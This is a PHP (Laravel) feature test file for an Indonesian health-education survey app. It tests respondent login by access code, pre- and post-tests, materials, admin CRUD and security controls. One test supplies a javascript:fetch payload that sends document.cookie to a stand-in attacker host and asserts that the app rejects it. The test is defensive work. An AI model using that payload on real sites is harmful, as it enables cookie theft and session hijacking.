<?php

namespace Tests\Feature;

use App\Models\Answer;
use App\Models\Location;
use App\Models\Material;
use App\Models\Question;
use App\Models\QuestionOption;
use App\Models\Respondent;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Hash;
use Tests\TestCase;

class FlowTest extends TestCase
{
    use RefreshDatabase;

    /** Satu soal MC (benar = opsi A, skor 10) + satu soal likert favourable. */
    private function seedQuestions(string $type): array
    {
        $mc = Question::create([
            'question_text' => "Soal MC $type",
            'type' => $type,
            'order' => 1,
            'question_format' => 'multiple_choice',
        ]);
        $benar = QuestionOption::create([
            'question_id' => $mc->id, 'label' => 'A', 'option_text' => 'Benar',
            'is_correct' => true, 'score' => 10,
        ]);
        $salah = QuestionOption::create([
            'question_id' => $mc->id, 'label' => 'B', 'option_text' => 'Salah',
            'is_correct' => false, 'score' => 0,
        ]);

        $likert = Question::create([
            'question_text' => "Soal likert $type",
            'type' => $type,
            'order' => 2,
            'question_format' => 'likert',
            'is_favourable' => true,
        ]);
        $ss = QuestionOption::create([
            'question_id' => $likert->id, 'label' => 'SS', 'option_text' => 'Sangat Setuju',
            'is_correct' => false, 'score' => 5,
        ]);

        return compact('mc', 'benar', 'salah', 'likert', 'ss');
    }

    private function buatResponden(array $overrides = []): Respondent
    {
        return Respondent::create(array_merge([
            'access_code' => 'SEHAT001',
            'name' => 'Budi',
            'age' => 30,
            'gender' => 'laki-laki',
            'marital_status' => 'menikah',
            'occupation' => 'Petani',
            'total_children' => 2,
            'medical_history' => ['hipertensi'],
        ], $overrides));
    }

    // ── Auth responden ────────────────────────────────────────────────

    public function test_root_redirect_ke_login(): void
    {
        $this->get('/')->assertRedirect(route('login'));
    }

    public function test_register_menyimpan_semua_field_yang_divalidasi(): void
    {
        $lokasi = Location::create(['name' => 'Puskesmas A']);

        $this->post('/register', [
            'name' => 'Siti',
            'age' => 28,
            'gender' => 'perempuan',
            'marital_status' => 'menikah',
            'occupation' => 'Guru',
            'total_children' => 3,
            'medical_history' => ['diabetes'],
            'location_id' => $lokasi->id,
        ])->assertRedirect(route('respondent.home'));

        $r = Respondent::firstWhere('name', 'Siti');
        $this->assertNotNull($r);
        $this->assertMatchesRegularExpression('/^SEHAT\d{4}$/', $r->access_code);
        $this->assertSame(['diabetes'], $r->medical_history);
        // total_children divalidasi "required" dan diekspor ke Excel — harus tersimpan.
        $this->assertSame(3, $r->total_children);
    }

    public function test_login_dengan_kode_huruf_kecil_diterima(): void
    {
        $this->buatResponden();

        $this->post('/login', ['access_code' => 'sehat001'])
            ->assertRedirect(route('respondent.home'));
        $this->assertNotNull(session('respondent_id'));
    }

    public function test_kode_akses_lama_3_digit_tetap_bisa_login(): void
    {
        // Kode yang sudah terlanjur dibagikan sebelum format 4 digit.
        $this->buatResponden(['access_code' => 'SEHAT042']);

        $this->post('/login', ['access_code' => 'SEHAT042'])
            ->assertRedirect(route('respondent.home'));
        $this->assertNotNull(session('respondent_id'));
    }

    public function test_kode_akses_tidak_pernah_bentrok(): void
    {
        $lokasi = Location::create(['name' => 'Puskesmas A']);

        for ($i = 0; $i < 25; $i++) {
            $this->post('/register', [
                'name' => "Responden $i", 'age' => 30, 'gender' => 'perempuan',
                'marital_status' => 'menikah', 'occupation' => 'Petani',
                'total_children' => 1, 'location_id' => $lokasi->id,
            ]);
        }

        $kode = Respondent::pluck('access_code');
        $this->assertCount(25, $kode);
        $this->assertCount(25, $kode->unique(), 'Ada kode akses yang bentrok.');
    }

    public function test_percobaan_kode_salah_dibatasi(): void
    {
        $this->buatResponden(['access_code' => 'SEHAT0042']);

        // 10 percobaan gagal masih dilayani dengan pesan biasa.
        for ($i = 0; $i < 10; $i++) {
            $this->post('/login', ['access_code' => 'SEHAT9' . $i . '99'])
                ->assertSessionHas('error');
        }

        // Yang ke-11 diblokir.
        $this->post('/login', ['access_code' => 'SEHAT1234']);
        $this->assertStringContainsString('Terlalu banyak percobaan', session('error'));

        // Termasuk kode yang benar sekalipun — brute-force tidak boleh lolos
        // hanya karena tebakan terakhirnya kebetulan tepat.
        $this->post('/login', ['access_code' => 'SEHAT0042']);
        $this->assertNull(session('respondent_id'));
    }

    public function test_login_berhasil_tidak_menghabiskan_jatah_percobaan(): void
    {
        // Satu tempat praktik dengan banyak responden di satu WiFi: semua kode benar.
        for ($i = 1; $i <= 20; $i++) {
            $kode = 'SEHAT' . str_pad($i, 4, '0', STR_PAD_LEFT);
            $this->buatResponden(['access_code' => $kode, 'name' => "Responden $i"]);

            $this->post('/login', ['access_code' => $kode])
                ->assertRedirect(route('respondent.home'));
            $this->post('/logout');
        }
    }

    public function test_login_kode_tidak_dikenal_ditolak(): void
    {
        $this->post('/login', ['access_code' => 'SEHAT999'])
            ->assertRedirect()
            ->assertSessionHas('error');
        $this->assertNull(session('respondent_id'));
    }

    public function test_area_responden_tertutup_untuk_tamu(): void
    {
        foreach (['/beranda', '/profil', '/materi', '/buku-kerja/pre-test'] as $url) {
            $this->get($url)->assertRedirect(route('login'));
        }
    }

    public function test_logout_membersihkan_sesi(): void
    {
        $r = $this->buatResponden();
        $this->withSession(['respondent_id' => $r->id])
            ->post('/logout')->assertRedirect(route('login'));
    }

    // ── Pre-test ──────────────────────────────────────────────────────

    public function test_pretest_submit_menyimpan_jawaban_dan_menghitung_skor(): void
    {
        $r = $this->buatResponden();
        $q = $this->seedQuestions('pre');

        $this->withSession(['respondent_id' => $r->id])
            ->post('/buku-kerja/pre-test', ['answers' => [
                $q['mc']->id => $q['benar']->id,
                $q['likert']->id => $q['ss']->id,
            ]])
            ->assertRedirect(route('respondent.pretest'))
            ->assertSessionHas('show_result', true);

        $this->assertSame(2, Answer::where('test_type', 'pre')->count());
        $r->refresh();
        $this->assertTrue($r->pre_test_done);
        $this->assertNotNull($r->pre_test_at);

        $hasil = session('result');
        $this->assertSame(1, $hasil['mc_correct']);
        $this->assertSame(10, $hasil['mc_score']);
        $this->assertSame(5, $hasil['likert_score']);
    }

    public function test_pretest_menolak_jawaban_tidak_lengkap(): void
    {
        $r = $this->buatResponden();
        $this->seedQuestions('pre');

        $this->withSession(['respondent_id' => $r->id])
            ->post('/buku-kerja/pre-test', [])
            ->assertSessionHasErrors('answers');
        $this->assertFalse($r->refresh()->pre_test_done);
    }

    public function test_pretest_menolak_option_id_milik_soal_lain(): void
    {
        $r = $this->buatResponden();
        $q = $this->seedQuestions('pre');

        // Opsi dari soal likert dikirim sebagai jawaban soal MC.
        $this->withSession(['respondent_id' => $r->id])
            ->post('/buku-kerja/pre-test', ['answers' => [
                $q['mc']->id => $q['ss']->id,
                $q['likert']->id => $q['ss']->id,
            ]])
            ->assertSessionHasErrors();
    }

    public function test_pretest_tidak_bisa_dikirim_dua_kali(): void
    {
        $r = $this->buatResponden(['pre_test_done' => true]);
        $q = $this->seedQuestions('pre');

        $this->withSession(['respondent_id' => $r->id])
            ->post('/buku-kerja/pre-test', ['answers' => [$q['mc']->id => $q['benar']->id]])
            ->assertRedirect(route('respondent.home'));
        $this->assertSame(0, Answer::count());
    }

    // ── Autosave ──────────────────────────────────────────────────────

    public function test_autosave_tidak_menduplikasi_jawaban(): void
    {
        $r = $this->buatResponden();
        $q = $this->seedQuestions('pre');

        foreach ([$q['benar']->id, $q['salah']->id, $q['benar']->id] as $opt) {
            $this->withSession(['respondent_id' => $r->id])
                ->post('/buku-kerja/autosave', [
                    'test_type' => 'pre',
                    'question_id' => $q['mc']->id,
                    'question_option_id' => $opt,
                ])->assertJson(['status' => 'saved']);
        }

        $this->assertSame(1, Answer::count());
        $this->assertSame($q['benar']->id, Answer::first()->question_option_id);
    }

    public function test_autosave_ditolak_tanpa_sesi(): void
    {
        $this->post('/buku-kerja/autosave', ['test_type' => 'pre'])
            ->assertRedirect(route('login'));
    }

    // ── Materi ────────────────────────────────────────────────────────

    public function test_materi_terkunci_sebelum_pretest(): void
    {
        $r = $this->buatResponden();

        $this->withSession(['respondent_id' => $r->id])
            ->get('/materi')
            ->assertRedirect(route('respondent.home'))
            ->assertSessionHas('error');
    }

    public function test_membaca_semua_materi_menandai_material_done(): void
    {
        $r = $this->buatResponden(['pre_test_done' => true]);
        $m1 = Material::create(['title' => 'A', 'type' => 'artikel', 'content' => 'isi', 'order' => 1]);
        $m2 = Material::create(['title' => 'B', 'type' => 'artikel', 'content' => 'isi', 'order' => 2]);

        $this->withSession(['respondent_id' => $r->id])->get('/materi')->assertOk();

        $this->withSession(['respondent_id' => $r->id])
            ->post("/materi/{$m1->id}/baca")->assertJson(['material_done' => false]);
        $this->withSession(['respondent_id' => $r->id])
            ->post("/materi/{$m2->id}/baca")->assertJson(['material_done' => true]);

        $this->assertTrue($r->refresh()->material_done);
    }

    public function test_materi_yang_tidak_ada_tidak_bisa_ditandai_dibaca(): void
    {
        $r = $this->buatResponden(['pre_test_done' => true]);

        $this->withSession(['respondent_id' => $r->id])
            ->post('/materi/424242/baca')
            ->assertNotFound();
    }

    // ── Post-test ─────────────────────────────────────────────────────

    public function test_posttest_submit_menyimpan_jawaban(): void
    {
        $r = $this->buatResponden(['pre_test_done' => true, 'material_done' => true]);
        $q = $this->seedQuestions('post');

        $this->withSession(['respondent_id' => $r->id])
            ->post('/buku-kerja/post-test', ['answers' => [
                $q['mc']->id => $q['benar']->id,
                $q['likert']->id => $q['ss']->id,
            ]])
            ->assertRedirect(route('respondent.posttest'));

        $r->refresh();
        $this->assertTrue($r->post_test_done);
        $this->assertSame(2, Answer::where('test_type', 'post')->count());
    }

    public function test_halaman_posttest_tetap_terbuka_bagi_yang_sudah_selesai(): void
    {
        // Data lama bisa punya post_test_done = true tapi material_done = false.
        $r = $this->buatResponden(['pre_test_done' => true, 'post_test_done' => true]);
        Material::create(['title' => 'A', 'type' => 'artikel', 'content' => 'isi', 'order' => 1]);
        $this->seedQuestions('post');

        $this->withSession(['respondent_id' => $r->id])
            ->get('/buku-kerja/post-test')->assertOk();
    }

    public function test_halaman_posttest_terkunci_sebelum_materi_dibaca(): void
    {
        $r = $this->buatResponden(['pre_test_done' => true]);
        Material::create(['title' => 'A', 'type' => 'artikel', 'content' => 'isi', 'order' => 1]);
        $this->seedQuestions('post');

        $this->withSession(['respondent_id' => $r->id])
            ->get('/buku-kerja/post-test')
            ->assertRedirect(route('respondent.material'));
    }

    public function test_posttest_terkunci_sebelum_materi_selesai(): void
    {
        $r = $this->buatResponden(); // belum pre-test, belum baca materi
        $q = $this->seedQuestions('post');

        $this->withSession(['respondent_id' => $r->id])
            ->post('/buku-kerja/post-test', ['answers' => [
                $q['mc']->id => $q['benar']->id,
                $q['likert']->id => $q['ss']->id,
            ]])
            ->assertRedirect(route('respondent.home'));

        $this->assertFalse($r->refresh()->post_test_done);
    }

    // ── Halaman responden lain ────────────────────────────────────────

    // Konsultasi & dokter sengaja tidak diuji — di-descope ke pengembangan lanjutan
    // dan tidak tertaut dari navigasi mana pun.
    public function test_beranda_dan_profil_dapat_dibuka(): void
    {
        $lokasi = Location::create(['name' => 'Puskesmas A']);
        $r = $this->buatResponden(['location_id' => $lokasi->id]);

        foreach (['/beranda', '/profil'] as $url) {
            $this->withSession(['respondent_id' => $r->id])->get($url)->assertOk();
        }
    }

    // ── Admin ─────────────────────────────────────────────────────────

    private function admin(): User
    {
        return User::create([
            'name' => 'Admin', 'email' => 'admin@test.id',
            'password' => Hash::make('rahasia'), 'is_admin' => true,
        ]);
    }

    public function test_admin_login_dan_dashboard(): void
    {
        $this->admin();
        $lokasi = Location::create(['name' => 'Puskesmas A']);
        $this->buatResponden(['location_id' => $lokasi->id, 'pre_test_done' => true]);

        $this->post('/admin/login', ['email' => 'admin@test.id', 'password' => 'rahasia'])
            ->assertRedirect(route('admin.dashboard'));

        $this->actingAs(User::first())->get('/admin/dashboard')->assertOk();
    }

    public function test_admin_login_salah_ditolak(): void
    {
        $this->admin();
        $this->post('/admin/login', ['email' => 'admin@test.id', 'password' => 'salah'])
            ->assertSessionHas('error');
        $this->assertGuest();
    }

    public function test_login_admin_meregenerasi_session_id(): void
    {
        $this->admin();
        $this->startSession();
        $sebelum = session()->getId();

        $this->post('/admin/login', ['email' => 'admin@test.id', 'password' => 'rahasia']);

        $this->assertNotSame($sebelum, session()->getId());
    }

    public function test_tamu_di_area_admin_diarahkan_ke_login_admin(): void
    {
        $this->get('/admin/dashboard')->assertRedirect(route('admin.login'));
    }

    public function test_responden_tidak_bisa_masuk_area_admin(): void
    {
        $r = $this->buatResponden();
        $this->withSession(['respondent_id' => $r->id])
            ->get('/admin/dashboard')
            ->assertRedirect(route('admin.login'));
    }

    public function test_user_biasa_bukan_admin_tidak_bisa_masuk_area_admin(): void
    {
        $biasa = User::create([
            'name' => 'Bukan Admin', 'email' => 'user@test.id', 'password' => Hash::make('rahasia'),
        ]);

        $this->actingAs($biasa)->get('/admin/dashboard')->assertForbidden();
    }

    // ── Keamanan (OWASP) ──────────────────────────────────────────────

    public function test_percobaan_login_admin_dibatasi(): void
    {
        $this->admin();

        for ($i = 0; $i < 5; $i++) {
            $this->post('/admin/login', ['email' => 'admin@test.id', 'password' => 'salah'])
                ->assertSessionHas('error');
        }

        // Percobaan ke-6 diblokir, bahkan dengan password yang benar sekalipun.
        $this->post('/admin/login', ['email' => 'admin@test.id', 'password' => 'rahasia']);
        $this->assertStringContainsString('Terlalu banyak percobaan', session('error'));
        $this->assertGuest();
    }

    public function test_login_responden_mengganti_id_sesi(): void
    {
        $this->buatResponden();
        $this->startSession();
        $sebelum = session()->getId();

        $this->post('/login', ['access_code' => 'SEHAT001']);

        $this->assertNotSame($sebelum, session()->getId(), 'Session fixation: ID sesi tidak diganti saat login.');
    }

    public function test_logout_responden_membuang_seluruh_sesi(): void
    {
        $r = $this->buatResponden();

        $this->withSession(['respondent_id' => $r->id, 'jejak_lain' => 'ada'])->post('/logout');

        $this->assertNull(session('respondent_id'));
        $this->assertNull(session('jejak_lain'), 'Sisa sesi masih hidup setelah logout.');
    }

    public function test_header_keamanan_terpasang(): void
    {
        $this->get('/login')
            ->assertHeader('X-Frame-Options', 'DENY')
            ->assertHeader('X-Content-Type-Options', 'nosniff')
            ->assertHeader('Referrer-Policy', 'same-origin');
    }

    public function test_materi_menolak_url_javascript(): void
    {
        $admin = $this->admin();

        $this->actingAs($admin)->post('/admin/materi', [
            'title' => 'Materi jahat',
            'type' => 'video',
            'content' => "javascript:fetch('https://attacker.id/?c='+document.cookie)",
            'order' => 1,
        ])->assertSessionHasErrors('content');

        $this->assertSame(0, Material::count());
    }

    public function test_admin_crud_soal(): void
    {
        $admin = $this->admin();

        $this->actingAs($admin)->post('/admin/soal', [
            'question_text' => 'Apa itu hipertensi?',
            'type' => 'pre',
            'order' => 1,
            'question_format' => 'multiple_choice',
            'options' => [['text' => 'Tekanan darah tinggi'], ['text' => 'Demam']],
            'correct_option' => 0,
        ])->assertRedirect(route('admin.questions.index'));

        $soal = Question::first();
        $this->assertSame(2, $soal->options()->count());
        $this->assertSame(10, $soal->options()->where('is_correct', true)->first()->score);

        $this->actingAs($admin)->post('/admin/soal', [
            'question_text' => 'Saya rutin olahraga',
            'type' => 'post',
            'order' => 1,
            'question_format' => 'likert',
            'is_favourable' => 0,
        ])->assertRedirect(route('admin.questions.index'));

        $likert = Question::where('question_format', 'likert')->first();
        $this->assertSame(5, $likert->options()->count());
        // Unfavourable: STS harus bernilai 5.
        $this->assertSame(5, $likert->options()->where('label', 'STS')->first()->score);

        $this->actingAs($admin)->delete("/admin/soal/{$soal->id}")
            ->assertRedirect(route('admin.questions.index'));
        $this->assertSame(0, QuestionOption::where('question_id', $soal->id)->count());
    }

    public function test_mengedit_soal_tidak_menghapus_jawaban_responden(): void
    {
        $admin = $this->admin();
        $r = $this->buatResponden();
        $q = $this->seedQuestions('pre');
        Answer::create([
            'respondent_id' => $r->id,
            'question_id' => $q['mc']->id,
            'question_option_id' => $q['benar']->id,
            'test_type' => 'pre',
        ]);

        // Admin memperbaiki typo pada teks soal dan salah satu pilihan jawaban.
        $this->actingAs($admin)->put("/admin/soal/{$q['mc']->id}", [
            'question_text' => 'Soal MC pre (sudah diperbaiki)',
            'type' => 'pre',
            'order' => 1,
            'question_format' => 'multiple_choice',
            'options' => [['text' => 'Benar (diperbaiki)'], ['text' => 'Salah']],
            'correct_option' => 0,
        ])->assertRedirect(route('admin.questions.index'));

        $this->assertSame(1, Answer::count(), 'Jawaban responden hilang saat admin mengedit soal.');
        $this->assertSame($q['benar']->id, Answer::first()->question_option_id);
        $this->assertSame('Benar (diperbaiki)', $q['benar']->refresh()->option_text);
    }

    public function test_mengurangi_jumlah_pilihan_menghapus_opsi_berlebih(): void
    {
        $admin = $this->admin();
        $q = $this->seedQuestions('pre');

        $this->actingAs($admin)->put("/admin/soal/{$q['mc']->id}", [
            'question_text' => 'Soal MC pre',
            'type' => 'pre',
            'order' => 1,
            'question_format' => 'multiple_choice',
            'options' => [['text' => 'Hanya satu pilihan tersisa'], ['text' => 'Dua']],
            'correct_option' => 1,
        ]);

        $this->assertSame(2, $q['mc']->options()->count());
    }

    // ── Kelola Lokasi ─────────────────────────────────────────────────

    public function test_admin_kelola_lokasi(): void
    {
        $admin = $this->admin();

        $this->actingAs($admin)->get('/admin/lokasi')->assertOk();

        $this->actingAs($admin)->post('/admin/lokasi', ['name' => 'PMB Bidan Sari'])
            ->assertRedirect(route('admin.locations.index'));
        $this->assertSame(1, Location::count());

        // Nama ganda ditolak supaya tidak ada dua lokasi yang sama di dropdown.
        $this->actingAs($admin)->post('/admin/lokasi', ['name' => 'PMB Bidan Sari'])
            ->assertSessionHasErrors('name');
        $this->assertSame(1, Location::count());

        $lokasi = Location::first();
        $this->actingAs($admin)->put("/admin/lokasi/{$lokasi->id}", ['name' => 'PMB Bidan Sari Dewi'])
            ->assertRedirect(route('admin.locations.index'));
        $this->assertSame('PMB Bidan Sari Dewi', $lokasi->refresh()->name);

        $this->actingAs($admin)->delete("/admin/lokasi/{$lokasi->id}");
        $this->assertSame(0, Location::count());
    }

    public function test_lokasi_yang_dipakai_responden_tidak_bisa_dihapus(): void
    {
        $admin = $this->admin();
        $lokasi = Location::create(['name' => 'PMB Bidan Sari']);
        $this->buatResponden(['location_id' => $lokasi->id]);

        $this->actingAs($admin)->delete("/admin/lokasi/{$lokasi->id}")
            ->assertSessionHas('error');
        $this->assertSame(1, Location::count());
    }

    public function test_admin_halaman_daftar_dan_export(): void
    {
        $admin = $this->admin();
        $lokasi = Location::create(['name' => 'Puskesmas A']);
        $r = $this->buatResponden(['location_id' => $lokasi->id]);
        $q = $this->seedQuestions('pre');
        Answer::create([
            'respondent_id' => $r->id,
            'question_id' => $q['mc']->id,
            'question_option_id' => $q['benar']->id,
            'test_type' => 'pre',
        ]);

        foreach (['/admin/responden', '/admin/hasil-test', '/admin/soal', '/admin/materi', '/admin/lokasi'] as $url) {
            $this->actingAs($admin)->get($url)->assertOk();
        }

        $this->actingAs($admin)->get('/admin/export/csv')->assertOk();
        $this->actingAs($admin)->get('/admin/export/excel')->assertOk();
    }
}
